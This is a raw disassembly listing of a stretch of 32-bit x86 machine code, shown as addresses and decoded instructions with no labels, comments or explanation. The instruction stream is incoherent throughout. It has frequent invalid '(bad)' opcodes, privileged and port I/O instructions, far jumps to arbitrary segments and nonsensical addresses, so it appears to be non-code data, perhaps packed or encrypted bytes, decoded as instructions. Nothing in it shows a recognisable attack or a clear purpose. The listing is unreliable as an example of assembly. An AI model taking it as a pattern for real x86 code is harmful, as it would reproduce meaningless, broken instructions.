  40207a:	cmp    ah,BYTE PTR [ebx-0x64]
  40207d:	jmp    0x820cc109
  402082:	pop    es
  402083:	and    BYTE PTR [ebx-0x12],al
  402086:	loop   0x4020f0
  402088:	pop    es
  402089:	jmp    0xe60e0777
  40208e:	or     eax,0xb1c6dd7b
  402093:	(bad)  
  402094:	xor    DWORD PTR [esi+0x6d076132],ebp
  40209a:	pop    es
  40209b:	scas   eax,DWORD PTR es:[edi]
  40209c:	in     eax,dx
  40209d:	in     eax,dx
  40209e:	dec    eax
  40209f:	sti    
  4020a0:	fld    TBYTE PTR [edx]
  4020a2:	xchg   ebp,eax
  4020a3:	shr    DWORD PTR ds:0xb4b6aa5c,cl
  4020a9:	mov    al,0x5d
  4020ab:	jp     0x40211f
  4020ad:	mov    ds,eax
  4020af:	mov    ecx,ss
  4020b1:	cmp    al,0xb6
  4020b3:	(bad)  
  4020b5:	(bad)  
  4020b6:	stc    
  4020b7:	push   ss
  4020b8:	aam    0x9f
  4020ba:	call   0xef4f:0x4813a2af
  4020c1:	and    bh,0x5c
  4020c4:	xor    ch,BYTE PTR [eax-0x46]
  4020c7:	push   ecx
  4020c8:	add    al,0x87
  4020ca:	je     0x4020c7
  4020cc:	stc    
  4020cd:	xchg   ebp,eax
  4020ce:	(bad)  
  4020d0:	push   0xc
  4020d2:	mov    edx,0x4c9cac68
  4020d7:	xchg   edi,eax
  4020d8:	mov    es,WORD PTR [edi+0x20]
  4020db:	add    eax,0x1940d8aa
  4020e0:	and    eax,0xf213de7
  4020e5:	pop    ebx
  4020e6:	loop   0x4020e6
  4020e8:	push   cs
  4020e9:	inc    edx
  4020ea:	mov    fs,WORD PTR [ecx+0x7ca3147f]
  4020f0:	push   cs
  4020f1:	into   
  4020f2:	aaa    
  4020f3:	xor    BYTE PTR [esi+ebx*2],cl
  4020f6:	xor    bl,al
  4020f8:	and    ah,BYTE PTR [esi+0x5a]
  4020fb:	jno    0x40212f
  4020fd:	dec    edx
  4020fe:	cmp    cl,BYTE PTR [ecx-0x56]
  402101:	adc    eax,0x10b1d57e
  402106:	loopne 0x402128
  402108:	mov    edi,0x882fa378
  40210d:	fadd   DWORD PTR [ebx+ebp*4]
  402110:	and    al,0xf4
  402112:	stc    
  402113:	dec    edx
  402114:	jecxz  0x4020b7
  402116:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402117:	sbb    DWORD PTR [edx],0x9d5356e4
  40211d:	jle    0x4020be
  40211f:	mov    al,ds:0xe80de32d
  402124:	and    eax,0xeb8c1127
  402129:	adc    DWORD PTR [edx+0x208a0896],0xa1144f20
  402133:	retf   0xd6d8
  402136:	pushf  
  402137:	pop    es
  402138:	(bad)  
  402139:	mov    ebx,0x68dd65e6
  40213e:	out    0x1f,eax
  402140:	test   DWORD PTR [esi-0x5],edi
  402143:	and    eax,0xfa284cd3
  402148:	inc    ebp
  402149:	xchg   ebp,eax
  40214a:	pop    ebp
  40214b:	jecxz  0x4021c7
  40214d:	sahf   
  40214e:	push   eax
  40214f:	fistp  DWORD PTR [esi]
  402151:	in     eax,dx
  402152:	out    dx,eax
  402153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402154:	aad    0xc0
  402156:	ins    DWORD PTR es:[edi],dx
  402157:	inc    esi
  402158:	mov    ebx,0x700866a1
  40215d:	fcom   DWORD PTR [ebx+0x1aff644b]
  402163:	push   es
  402164:	scas   al,BYTE PTR es:[edi]
  402165:	jecxz  0x40219f
  402167:	fs pop edi
  402169:	push   ebp
  40216a:	clc    
  40216b:	pushf  
  40216c:	hlt    
  40216d:	dec    ebx
  40216e:	test   BYTE PTR [ebx],bl
  402170:	addr16 jle 0x40211b
  402173:	call   0x227e:0x10c07c28
  40217a:	aas    
  40217b:	fidiv  DWORD PTR [edi-0x68]
  40217e:	(bad)  
  40217f:	dec    ebx
  402180:	mov    al,ds:0xdb1fc4cd
  402185:	cmc    
  402186:	outs   dx,BYTE PTR ds:[esi]
  402187:	(bad)  
  402188:	in     eax,dx
  402189:	sub    dl,BYTE PTR [ecx+0x21b05dbc]
  40218f:	push   ebp
  402190:	push   ebp
  402191:	cmp    dl,BYTE PTR [ebp-0xcb4705d]
  402197:	imul   edx,DWORD PTR [ebx+ecx*2+0xe],0x11
  40219c:	ins    BYTE PTR es:[edi],dx
  40219d:	or     ecx,DWORD PTR [ebx+0x7]
  4021a0:	mov    cl,0xcf
  4021a2:	ds xor eax,0xb633ddfa
  4021a8:	scas   eax,DWORD PTR es:[edi]
  4021a9:	mov    eax,0xd734c5e2
  4021ae:	adc    DWORD PTR [ecx+0x2d],0x52
  4021b2:	mov    ch,0x2a
  4021b4:	mov    BYTE PTR [ebx-0x79803e34],ch
  4021ba:	sbb    BYTE PTR [edx],bl
  4021bc:	sbb    DWORD PTR [ebp+0x7719f5b4],edx
  4021c2:	aad    0x4a
  4021c4:	minps  xmm4,XMMWORD PTR [esi-0x32]
  4021c8:	mov    ah,0x1c
  4021ca:	inc    ebp
  4021cb:	and    DWORD PTR [edx-0x52],ecx
  4021ce:	icebp  
  4021cf:	push   0x8b69c111
  4021d4:	lods   eax,DWORD PTR ds:[esi]
  4021d5:	xor    al,0xc2
  4021d7:	sbb    eax,0x92c47311
  4021dc:	icebp  
  4021dd:	bnd jl 0x4021cc
  4021e0:	stc    
  4021e1:	jecxz  0x4021c7
  4021e3:	mov    ss,WORD PTR [bx+si-0x80]
  4021e7:	out    dx,al
  4021e8:	enter  0x2fd2,0xb7
  4021ec:	fsubp  st(6),st
  4021ee:	or     eax,0x708e72b7
  4021f3:	xor    dh,BYTE PTR [ecx-0x118e6b0c]
  4021f9:	and    al,0xa2
  4021fb:	jno    0x402259
  4021fd:	fs mov ebx,0x75629454
  402203:	js     0x4021fa
  402205:	xchg   esi,eax
  402206:	sub    al,0xbe
  402208:	push   edx
  402209:	(bad)  
  40220a:	jg     0x402196
  40220c:	sub    dl,BYTE PTR [edx+0x7af80a8b]
  402212:	les    ecx,FWORD PTR [ebx+0x53]
  402215:	fstp   QWORD PTR [ebx]
  402217:	iret   
  402218:	add    ebp,DWORD PTR [eax-0x38]
  40221b:	pop    ebp
  40221c:	pop    esi
  40221d:	inc    edx
  40221e:	inc    ebx
  40221f:	jo     0x4021b0
  402221:	call   0x7f29b7e8
  402226:	daa    
  402227:	cli    
  402228:	sbb    al,0xe6
  40222a:	cmc    
  40222b:	jmp    0x9433:0x30bbe90d
  402232:	repz pop esi
  402234:	xor    eax,0xbaf6766d
  402239:	repnz in eax,dx
  40223b:	add    eax,0x21b16f78
  402240:	lds    ebp,FWORD PTR [edx+0x7c]
  402243:	nop
  402244:	sbb    al,0x81
  402246:	push   es
  402247:	ds add eax,0x7107b6b2
  40224d:	push   ecx
  40224e:	cmp    DWORD PTR [esi],edx
  402250:	ins    BYTE PTR es:[edi],dx
  402251:	jl     0x402269
  402253:	jne    0x402207
  402255:	mov    bl,0xe1
  402257:	pop    edi
  402258:	inc    esi
  402259:	jmp    0x402202
  40225b:	aas    
  40225c:	jbe    0x40222a
  40225e:	(bad)  
  40225f:	mov    ebx,0xe27aeeab
  402264:	adc    BYTE PTR cs:[edi],al
  402267:	rol    dl,cl
  402269:	adc    eax,0xac1e2a3e
  40226e:	sub    BYTE PTR [ebp+0x666b8101],0x94
  402275:	or     cl,BYTE PTR [ebx-0x35453e79]
  40227b:	push   ebp
  40227c:	arpl   WORD PTR [ecx*2+0x72cf2474],bx
  402283:	pop    ebx
  402284:	mov    ds:0x6a825a96,al
  402289:	fsub   QWORD PTR [ecx]
  40228b:	popf   
  40228c:	loop   0x4022eb
  40228e:	shr    DWORD PTR ds:0xdb11b404,cl
  402294:	inc    ebp
  402295:	adc    DWORD PTR [ecx+0x66],ecx
  402298:	clc    
  402299:	retf   
  40229a:	add    bh,BYTE PTR [esi+0x4af07c75]
  4022a0:	sahf   
  4022a1:	dec    ecx
  4022a2:	popa   
  4022a3:	mov    bh,0x51
  4022a5:	retf   
  4022a6:	pop    edi
  4022a7:	iret   
  4022a8:	or     DWORD PTR [eax+0x5a60480f],ebx
  4022ae:	fwait
  4022af:	push   ecx
  4022b0:	sbb    dl,ch
  4022b2:	in     al,0xd2
  4022b4:	xor    eax,0x6f780124
  4022b9:	add    al,0xce
  4022bb:	rcl    DWORD PTR [edx-0x79fe4550],0x7d
  4022c2:	sbb    al,BYTE PTR [ecx-0x4f]
  4022c5:	outs   dx,BYTE PTR ds:[esi]
  4022c6:	add    DWORD PTR [esi-0x4b],edx
  4022c9:	sub    BYTE PTR [ebx-0x7d],cl
  4022cc:	retf   0xbd32
  4022cf:	inc    esp
  4022d0:	cdq    
  4022d1:	arpl   WORD PTR [esi+0x7987834c],bx
  4022d7:	jns    0x402310
  4022d9:	hlt    
  4022da:	cli    
  4022db:	or     al,0x4c
  4022dd:	scas   al,BYTE PTR es:[edi]
  4022de:	or     al,0x70
  4022e0:	outs   dx,BYTE PTR ds:[esi]
  4022e1:	loop   0x402336
  4022e3:	cli    
  4022e4:	popa   
  4022e5:	addr16 sub al,0xe6
  4022e8:	mov    dh,0x7
  4022ea:	ret    
  4022eb:	cmp    BYTE PTR [di-0x6a],al
  4022ef:	cmp    DWORD PTR [ecx-0xa588499],edi
  4022f5:	or     BYTE PTR [ecx-0x13],dh
  4022f8:	cld    
  4022f9:	call   0x8a72:0x625a4ed5
  402300:	rol    BYTE PTR [eax+0x1a259fe1],1
  402306:	inc    ebx
  402307:	mov    ah,0xdd
  402309:	loopne 0x40230c
  40230b:	enter  0x1a6f,0x4a
  40230f:	pop    ecx
  402310:	jb     0x4022c8
  402312:	(bad)  
  402313:	fsub   DWORD PTR [esi+ebp*2]
  402316:	cmp    BYTE PTR [edi-0x55],bl
  402319:	imul   eax,esp,0xb6faaa7
  40231f:	loope  0x402350
  402321:	cdq    
  402322:	cmc    
  402323:	test   al,0x71
  402325:	cs inc esp
  402327:	push   eax
  402328:	repz xor eax,0xcf54674c
  40232e:	sub    esp,DWORD PTR [ecx+edi*4-0x6e]
  402332:	rcl    BYTE PTR [edi+0x2c47b533],0x9d
  402339:	jecxz  0x402306
  40233b:	lea    ecx,[ecx+0x6ed4fec1]
  402341:	jle    0x402358
  402343:	mov    cl,0xea
  402345:	jecxz  0x402344
  402347:	sub    dh,bh
  402349:	pinsrw mm4,WORD PTR [edx],0x7d
  40234d:	add    al,0x1b
  40234f:	rcl    BYTE PTR [ebx],cl
  402351:	and    al,0x6c
  402353:	hlt    
  402354:	sub    DWORD PTR [esi+0x18],eax
  402357:	std    
  402358:	sbb    edi,DWORD PTR [ecx-0x4a]
  40235b:	mov    eax,ds:0x102db28d
  402360:	and    BYTE PTR [ecx+0x6c],bh
  402363:	cdq    
  402364:	out    0x6f,al
  402366:	or     eax,DWORD PTR [ebp+0x45]
  402369:	jge    0x402397
  40236b:	std    
  40236c:	mov    eax,0xa95104d7
  402371:	sub    eax,0x750cd221
  402376:	push   eax
  402377:	shl    DWORD PTR [ebp-0x7b],cl
  40237a:	cmp    DWORD PTR [eax+0x79],edi
  40237d:	mov    eax,0x13186e3d
  402382:	bnd ret 0x6a28
  402386:	cmp    eax,0x4e2bec5a
  40238b:	jnp    0x40231d
  40238d:	add    DWORD PTR [esi+0x10c62107],ecx
  402393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402394:	pop    esp
  402395:	clc    
  402396:	cmp    DWORD PTR [esi-0x6c624817],ecx
  40239c:	pop    edx
  40239d:	and    bh,BYTE PTR [eax+0x30]
  4023a0:	outs   dx,BYTE PTR ds:[esi]
  4023a1:	push   edx
  4023a2:	mov    cl,0xf5
  4023a4:	sahf   
  4023a5:	mov    WORD PTR ds:0xc3840cea,ss
  4023ab:	jle    0x4023ba
  4023ad:	mov    esi,0x1cd825ee
  4023b2:	stos   DWORD PTR es:[edi],eax
  4023b3:	fdivr  QWORD PTR [edx+0x16]
  4023b6:	cmp    al,bh
  4023b8:	mov    cl,0xc4
  4023ba:	leave  
  4023bb:	repnz inc esp
  4023bd:	and    DWORD PTR [edx+ebp*4],edi
  4023c0:	sbb    al,0x6f
  4023c2:	add    BYTE PTR [esi],al
  4023c4:	push   eax
  4023c5:	inc    ebp
  4023c6:	imul   ebx,DWORD PTR [esi+0x20d36dcb],0xf286ba60
  4023d0:	or     DWORD PTR [esi+0x7f],ecx
  4023d3:	aam    0x66
  4023d5:	cmp    ah,BYTE PTR [ecx+eax*1+0x48054a95]
  4023dc:	add    al,0x64
  4023de:	mov    dh,0x66
  4023e0:	xchg   DWORD PTR [edx-0x36],esp
  4023e3:	sti    
  4023e4:	js     0x402453
  4023e6:	pop    es
  4023e7:	in     al,0x9b
  4023e9:	push   ebx
  4023ea:	je     0x4023be
  4023ec:	and    ebp,eax
  4023ee:	inc    ecx
  4023ef:	push   ecx
  4023f0:	ret    
  4023f1:	mov    BYTE PTR [esi],ch
  4023f3:	xor    BYTE PTR [esi],ch
  4023f5:	pop    ss
  4023f6:	cld    
  4023f7:	pop    es
  4023f8:	mov    ecx,0x233bc746
  4023fd:	push   ds
  4023fe:	aam    0xdb
  402400:	xchg   esi,eax
  402401:	pop    ebx
  402402:	mov    eax,ds:0xd4a008c4
  402407:	inc    esp
  402408:	sbb    eax,0x723c4452
  40240d:	ja     0x4023c9
  40240f:	xor    DWORD PTR [esi+ebp*1+0x74],edi
  402413:	mov    ah,0x90
  402415:	push   esi
  402416:	ss cmp ecx,eax
  402419:	cmp    DWORD PTR [ebx+0x207737d5],edi
  40241f:	pop    ecx
  402420:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402421:	xor    BYTE PTR [ebp-0x14f37de],0x5d
  402428:	push   ss
  402429:	call   DWORD PTR [edi+eiz*2-0x28]
  40242d:	lahf   
  40242e:	cmp    eax,esi
  402430:	jmp    0xcdab:0x4780d16e
  402437:	lahf   
  402438:	nop
  402439:	test   BYTE PTR [ecx+0x7a],dl
  40243c:	push   ecx
  40243d:	ds sbb bl,al
  402440:	not    edx
  402442:	fwait
  402443:	call   0x1ca270fa
  402448:	xor    ecx,DWORD PTR [ebx+ebp*4+0x3fe79646]
  40244f:	xchg   edi,eax
  402450:	inc    edx
  402451:	push   ebx
  402452:	mov    ebx,0x7c4a9ff5
  402457:	mov    edi,0x5ac084b2
  40245c:	loopne 0x402455
  40245e:	adc    DWORD PTR [edx-0x37],edi
  402461:	mov    al,0xb
  402463:	inc    edi
  402464:	push   ecx
  402465:	in     al,0xc5
  402467:	arpl   sp,di
  402469:	mov    ebp,edi
  40246b:	xlat   BYTE PTR ds:[ebx]
  40246c:	ds ins DWORD PTR es:[edi],dx
  40246e:	imul   DWORD PTR [ebp-0x2a2087ce]
  402474:	dec    edx
  402475:	test   eax,0x3c4b5af
  40247a:	mov    DWORD PTR [edx+ebx*2],edi
  40247d:	shl    BYTE PTR [esi+ecx*4],1
  402480:	icebp  
  402481:	or     al,0xa3
  402483:	test   DWORD PTR [eax-0x5e],esp
  402486:	mov    eax,0x54385079
  40248b:	or     ah,BYTE PTR ds:0xc9742d3b
  402491:	mov    dl,0x1f
  402493:	gs (bad) 
  402495:	scas   al,BYTE PTR es:[edi]
  402496:	push   0xffffffe3
  402498:	scas   al,BYTE PTR es:[edi]
  402499:	inc    esp
  40249a:	or     eax,0x195a1233
  40249f:	and    eax,0x4a75a072
  4024a4:	push   ss
  4024a5:	add    eax,0xc70121fe
  4024aa:	imul   edi,DWORD PTR [esi-0x75],0x66
  4024ae:	sbb    eax,0xc87a664c
  4024b3:	ss pop esp
  4024b5:	test   BYTE PTR [edx+0x725c6c86],dh
  4024bb:	jnp    0x402466
  4024bd:	stos   BYTE PTR es:[edi],al
  4024be:	out    dx,al
  4024bf:	lods   al,BYTE PTR ds:[esi]
  4024c0:	xlat   BYTE PTR ds:[ebx]
  4024c1:	xchg   BYTE PTR [esi+edi*4+0x4a775643],bl
  4024c8:	lods   eax,DWORD PTR ds:[esi]
  4024c9:	xor    BYTE PTR [eax+0x5e],cl
  4024cc:	std    
  4024cd:	test   DWORD PTR [ecx-0x1e5cf3dd],ecx
  4024d3:	pop    ds
  4024d4:	std    
  4024d5:	adc    BYTE PTR [ebx],ch
  4024d7:	lods   al,BYTE PTR ds:[esi]
  4024d8:	jle    0x402481
  4024da:	dec    esp
  4024db:	inc    ebp
  4024dc:	pop    edi
  4024dd:	call   0x469eec1
  4024e2:	cmp    al,0x46
  4024e4:	inc    eax
  4024e5:	jns    0x402513
  4024e7:	sahf   
  4024e8:	les    esi,FWORD PTR [edi+ecx*1+0x74]
  4024ec:	cmp    BYTE PTR [ebx+0x5],dh
  4024ef:	imul   eax,DWORD PTR [eax],0xf7be302b
  4024f5:	push   ecx
  4024f6:	or     esi,0x46
  4024f9:	hlt    
  4024fa:	add    BYTE PTR [edx+esi*4+0x4c678f7a],bl
  402501:	and    dl,BYTE PTR ds:0x67428593
  402507:	push   esp
  402508:	pop    ebx
  402509:	add    bh,BYTE PTR [ecx+0x66]
  40250c:	jae    0x40257b
  40250e:	pop    ds
  40250f:	fmul   QWORD PTR [edi+0x7ac19d28]
  402515:	(bad)  
  402516:	ror    BYTE PTR [ebp-0x238e4a9a],cl
  40251c:	dec    ebp
  40251d:	inc    edx
  40251e:	jmp    0x3dfd67e2
  402523:	aam    0xda
  402525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402526:	dec    ebp
  402527:	gs enter 0xf32e,0x8d
  40252c:	xchg   edi,eax
  40252d:	jecxz  0x4024ea
  40252f:	loope  0x40258d
  402531:	mov    bl,0xa8
  402533:	adc    DWORD PTR [eax+0x7b],esp
  402536:	and    ebx,DWORD PTR ds:0xe2c11454
  40253c:	sahf   
  40253d:	retf   
  40253e:	out    0xe8,al
  402540:	das    
  402541:	push   0xbadd2b08
  402546:	push   ebx
  402547:	pop    ecx
  402548:	rcl    DWORD PTR [eax-0x52f071a8],1
  40254e:	push   edx
  40254f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402550:	aam    0xa3
  402552:	test   DWORD PTR [esi-0x66],0xb87e9553
  402559:	or     DWORD PTR [ecx],edx
  40255b:	lods   eax,DWORD PTR ds:[esi]
  40255c:	(bad)  
  40255d:	mov    esp,0xd0df8cf3
  402562:	mov    ah,0x14
  402564:	mov    BYTE PTR [ecx+ebp*2],bh
  402567:	hlt    
  402568:	enter  0x1fe7,0x6f
  40256c:	mov    DWORD PTR [edi],0xaffa36d6
  402572:	inc    esp
  402573:	xor    dh,dl
  402575:	leave  
  402576:	je     0x402547
  402578:	psubsw mm1,mm4
  40257b:	iret   
  40257c:	cs and al,0x93
  40257f:	pop    ss
  402580:	jmp    0xc13aed89
  402585:	sti    
  402586:	repnz jecxz 0x402598
  402589:	sub    DWORD PTR [ebx],ebp
  40258b:	pop    eax
  40258c:	adc    DWORD PTR [esi+0xa],0x12dcc16a
  402593:	ins    BYTE PTR es:[edi],dx
  402594:	fidiv  DWORD PTR [ecx]
  402596:	je     0x40251d
  402598:	popa   
  402599:	popa   
  40259a:	pop    edi
  40259b:	inc    eax
  40259c:	pop    ebp
  40259d:	scas   al,BYTE PTR es:[edi]
  40259e:	js     0x40256c
  4025a0:	dec    esi
  4025a1:	aaa    
  4025a2:	mov    ecx,0x466caaad
  4025a7:	cmp    BYTE PTR ds:0x643f2e6b,bh
  4025ad:	(bad)  [esi]
  4025af:	cdq    
  4025b0:	adc    eax,0x8da01c44
  4025b5:	ret    
  4025b6:	loop   0x4025d2
  4025b8:	pop    ebp
  4025b9:	(bad)  
  4025ba:	lods   eax,DWORD PTR ds:[esi]
  4025bb:	pop    ds
  4025bc:	(bad)
  4025c0:	xchg   ebp,eax
  4025c1:	jge    0x402624
  4025c3:	arpl   WORD PTR [ecx+0x67be647e],di
  4025c9:	ret    
  4025ca:	and    bh,ah
  4025cc:	inc    ebp
  4025cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025ce:	push   edi
  4025cf:	xor    DWORD PTR [eax-0x51],eax
  4025d2:	fiadd  DWORD PTR [edi+0x9686bef]
  4025d8:	mov    esi,esi
  4025da:	mov    fs,edi
  4025dc:	(bad)  
  4025dd:	xchg   esp,eax
  4025de:	std    
  4025df:	aas    
  4025e0:	loopne 0x4025ac
  4025e2:	xor    dh,dh
  4025e4:	mov    eax,0x632c6fe
  4025e9:	adc    bl,0x56
  4025ec:	es icebp 
  4025ee:	push   ss
  4025ef:	and    DWORD PTR [edi+0x3733db30],edx
  4025f5:	icebp  
  4025f6:	(bad)  [esi-0x238366c]
  4025fc:	ins    BYTE PTR es:[edi],dx
  4025fd:	push   esp
  4025fe:	ja     0x40262f
  402600:	jno    0x402661
  402602:	and    eax,0x596d6d51
  402607:	and    DWORD PTR [ebx-0x69a4743f],edx
  40260d:	cwde   
  40260e:	and    DWORD PTR [eax+0x5b],ebp
  402611:	cmp    dl,BYTE PTR [edi+0x42]
  402614:	(bad)  
  402616:	call   0xf4b9:0x782a7de1
  40261d:	outs   dx,BYTE PTR ds:[esi]
  40261e:	cmp    DWORD PTR [edx],edx
  402620:	mov    es,WORD PTR [eax+0x39ce14ee]
  402626:	adc    BYTE PTR [eax+0x50],0xa7
  40262a:	popa   
  40262b:	pop    esp
  40262c:	ret    
  40262d:	es in  al,0x74
  402630:	jmp    0xb0d7:0x97c72766
  402637:	adc    dl,BYTE PTR [edx+0x663b5908]
  40263d:	fisttp QWORD PTR [esi-0x7]
  402640:	or     edi,DWORD PTR [esi-0x39]
  402643:	imul   ebx,DWORD PTR [ebp+0x4d7d6857],0xb4cb56e0
  40264d:	mov    eax,ds:0x23d7e511
  402652:	dec    ebx
  402653:	sbb    esi,DWORD PTR [eax-0x153744c7]
  402659:	sub    al,BYTE PTR [ebx-0x68]
  40265c:	xchg   esp,eax
  40265d:	push   edx
  40265e:	push   esi
  40265f:	pop    edx
  402660:	pop    ss
  402661:	in     eax,0x77
  402663:	xchg   edi,eax
  402664:	push   0xe308d8c5
  402669:	cmp    eax,0xb056609e
  40266e:	inc    edx
  40266f:	and    edx,DWORD PTR [edi+0x49aaad57]
  402675:	xor    ebp,DWORD PTR [ecx-0x185231c8]
  40267b:	push   cs
  40267c:	fist   DWORD PTR [esi+ecx*1+0x29]
  402680:	nop
  402681:	lods   al,BYTE PTR ds:[esi]
  402682:	bound  ebx,QWORD PTR [esi]
  402684:	xchg   esi,eax
  402685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402686:	je     0x40262c
  402688:	mov    bh,0xda
  40268a:	out    dx,eax
  40268b:	mov    edi,0x9adb2570
  402690:	in     al,0xa9
  402692:	sbb    ebx,ebx
  402694:	add    esp,DWORD PTR [edi]
  402696:	hlt    
  402697:	pushf  
  402698:	cmp    dl,BYTE PTR [edx+0x186de62b]
  40269e:	add    al,0x9
  4026a0:	mov    ch,0x77
  4026a2:	fisub  WORD PTR ds:0x8826a88c
  4026a8:	mov    ch,0x54
  4026aa:	add    esp,eax
  4026ac:	dec    eax
  4026ad:	dec    edi
  4026ae:	lahf   
  4026af:	or     bl,al
  4026b1:	mov    eax,0x8d5b1213
  4026b6:	sbb    al,0xe6
  4026b8:	shl    DWORD PTR [ebp+0x2eeabbd],0x9c
  4026bf:	or     ecx,DWORD PTR [ebx-0x76d1a66b]
  4026c5:	mov    al,ds:0xc7b6c5f4
  4026ca:	(bad)  
  4026cb:	or     DWORD PTR ds:0x157966af,esp
  4026d1:	bound  edi,QWORD PTR [esi-0x75]
  4026d4:	bound  eax,QWORD PTR [ebx+0x17]
  4026d7:	ret    0xd074
  4026da:	lods   eax,DWORD PTR ds:[esi]
  4026db:	pop    es
  4026dc:	add    al,0x3e
  4026de:	add    al,0xe0
  4026e0:	addr16 test bh,bl
  4026e3:	cli    
  4026e4:	retf   0x1f53
  4026e7:	adc    edi,DWORD PTR ds:0x8521ff79
  4026ed:	adc    DWORD PTR [edi+edi*2+0x79473e6b],edx
  4026f4:	out    dx,eax
  4026f5:	dec    edi
  4026f6:	xchg   esi,eax
  4026f7:	sub    bh,BYTE PTR [ebx+0xba8485b]
  4026fd:	aad    0x1b
  4026ff:	ja     0x4026db
  402701:	mov    ds:0x5d79c607,eax
  402706:	push   ebp
  402707:	cmp    eax,0x2b8333ae
  40270c:	pop    eax
  40270d:	push   0xfffffff3
  40270f:	sar    DWORD PTR [edx],1
  402711:	jl     0x402734
  402713:	xchg   ebp,eax
  402714:	adc    BYTE PTR [ecx-0x6],cl
  402717:	add    DWORD PTR [eax],ebp
  402719:	add    bh,dl
  40271b:	pop    ds
  40271c:	cwde   
  40271d:	xchg   DWORD PTR [esi],esp
  40271f:	dec    esi
  402720:	mov    edi,0x8893f044
  402725:	in     eax,dx
  402726:	ror    BYTE PTR [ecx],cl
  402728:	ret    0x6fed
  40272b:	fucomp st(7)
  40272d:	retf   
  40272e:	and    eax,0xa4a68edc
  402733:	in     eax,dx
  402734:	inc    ebp
  402735:	sbb    al,0xdc
  402737:	test   DWORD PTR [eax],eax
  402739:	and    al,0x11
  40273b:	mov    edx,0x7435cf36
  402740:	pop    ebx
  402741:	ins    BYTE PTR es:[edi],dx
  402742:	sbb    bh,BYTE PTR [edx+0x18]
  402745:	sbb    eax,0xc1b29172
  40274a:	js     0x4026f4
  40274c:	or     BYTE PTR [edx-0x28e41bf1],al
  402752:	fs pop es
  402754:	fcmovnb st,st(2)
  402756:	test   eax,0x451443db
  40275b:	pop    esp
  40275c:	push   ds
  40275d:	cld    
  40275e:	hlt    
  40275f:	add    BYTE PTR [ecx-0xb],dl
  402762:	popa   
  402763:	or     DWORD PTR [ebp+0x3b],esi
  402766:	mov    al,ds:0xe07c08db
  40276b:	pop    ss
  40276c:	enter  0x9344,0xf6
  402770:	hlt    
  402771:	mov    cl,0xef
  402773:	aaa    
  402774:	lock and DWORD PTR [eax+0x40],esi
  402778:	fadd   st(0),st
  40277a:	lds    eax,FWORD PTR [eax-0x64]
  40277d:	mov    edx,ss
  40277f:	sahf   
  402780:	(bad)  
  402781:	xor    DWORD PTR [ecx],ebx
  402783:	out    dx,eax
  402784:	add    DWORD PTR [edx-0x36],esi
  402787:	mov    ds:0xc3791cdf,eax
  40278c:	ins    DWORD PTR es:[edi],dx
  40278d:	cmp    edx,DWORD PTR [esi+0x18]
  402790:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402791:	into   
  402792:	ss or  eax,0xc03878f8
  402798:	nop
  402799:	outs   dx,BYTE PTR ds:[esi]
  40279a:	and    BYTE PTR ds:0x97290d06,cl
  4027a0:	push   0xced753b4
  4027a5:	push   ebx
  4027a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027a7:	(bad)  
  4027a8:	repnz ds mov edx,?
  4027ac:	sti    
  4027ad:	std    
  4027ae:	in     eax,dx
  4027af:	inc    ebx
  4027b0:	loope  0x40273a
  4027b2:	outs   dx,BYTE PTR ds:[esi]
  4027b3:	dec    edi
  4027b4:	hlt    
  4027b5:	or     cx,WORD PTR [esi-0x1f9caa7]
  4027bc:	mov    ebp,0x5eb43972
  4027c1:	or     eax,0x276dd1fc
  4027c6:	int3   
  4027c7:	retf   
  4027c8:	das    
  4027c9:	outs   dx,DWORD PTR ds:[esi]
  4027ca:	sahf   
  4027cb:	dec    ebx
  4027cc:	fdiv   QWORD PTR [edi]
  4027ce:	into   
  4027cf:	push   esi
  4027d0:	mov    esi,0x3416f0e1
  4027d5:	dec    edx
  4027d6:	dec    BYTE PTR [edx-0x271d3c66]
  4027dc:	loop   0x4027fb
  4027de:	push   ebp
  4027df:	jl     0x4027e1
  4027e1:	xchg   ebp,eax
  4027e2:	inc    esp
  4027e3:	mov    dh,0xa0
  4027e5:	push   edi
  4027e6:	imul   esi
  4027e8:	add    al,0x34
  4027ea:	aaa    
  4027eb:	inc    ebx
  4027ec:	pop    edi
  4027ed:	leave  
  4027ee:	inc    ebx
  4027ef:	rcl    BYTE PTR [ecx+0x64],1
  4027f2:	mov    dh,0x4a
  4027f4:	outs   dx,DWORD PTR ds:[esi]
  4027f5:	add    eax,DWORD PTR [eax+edi*4-0x3c]
  4027f9:	pop    eax
  4027fa:	pop    edi
  4027fb:	fbstp  TBYTE PTR [esi+0x1f2fd08c]
  402801:	arpl   WORD PTR [ecx],bp
  402803:	pop    esi
  402804:	xchg   ecx,eax
  402805:	pusha  
  402806:	add    BYTE PTR [edi+0x2bfa5660],bl
  40280c:	mov    dh,0xea
  40280e:	bound  ecx,QWORD PTR [esi+0x18]
  402811:	jg     0x4027e0
  402813:	lods   eax,DWORD PTR ds:[esi]
  402814:	ins    DWORD PTR es:[edi],dx
  402815:	pop    esi
  402816:	call   0x906e3a4
  40281b:	jbe    0x402874
  40281d:	outs   dx,DWORD PTR ds:[esi]
  40281e:	add    DWORD PTR [edx+0x44e2ef8f],esp
  402824:	add    edx,DWORD PTR [esi]
  402826:	aaa    
  402827:	mov    es,WORD PTR [ebx]
  402829:	mov    ds:0x14e09e1a,al
  40282e:	pop    ecx
  402830:	sbb    bl,BYTE PTR [edi+0x75]
  402833:	push   esp
  402834:	push   ecx
  402835:	sub    BYTE PTR [ebp+0x7db15a4e],bh
  40283b:	aas    
  40283c:	adc    DWORD PTR [esi+0x6c33eb1b],0x3f66734d
  402846:	dec    ecx
  402847:	in     eax,dx
  402848:	and    BYTE PTR [ecx-0x4e],dl
  40284b:	dec    esp
  40284c:	lahf   
  40284d:	shl    ecx,cl
  40284f:	push   edx
  402850:	adc    DWORD PTR [edx],edi
  402852:	mov    ds:0x2ba0f6d2,eax
  402857:	out    dx,eax
  402858:	push   es
  402859:	xchg   ebp,eax
  40285a:	xor    dh,BYTE PTR [esi-0x15]
  40285d:	dec    edx
